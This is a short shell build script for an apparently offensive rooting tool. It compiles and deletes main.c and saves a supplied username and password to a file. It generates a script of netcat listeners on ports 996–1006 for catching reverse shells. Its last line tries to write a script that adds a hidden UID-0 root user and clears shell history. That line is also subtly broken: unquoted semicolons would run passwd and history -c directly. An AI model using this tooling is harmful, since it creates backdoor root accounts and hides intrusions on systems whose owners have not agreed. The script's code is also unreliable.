#Build:
#USAGE - sh build.sh <ROOTING USER> <ROOTING PASS> <SERVER IP>

gcc main.c -o main
rm -rf main.c

echo $1 >> details.txt
echo $2 >> details.txt

echo screen -d -m bash -c "nc -l 996" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 997" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 998" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 999" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1000" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1001" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1002" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1003" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1004" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1005" >> openreverseshell.sh
echo screen -d -m bash -c "nc -l 1006" >> openreverseshell.sh

echo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1; echo -e $2"\n"$2 | passwd $1; history -c; >> root.sh
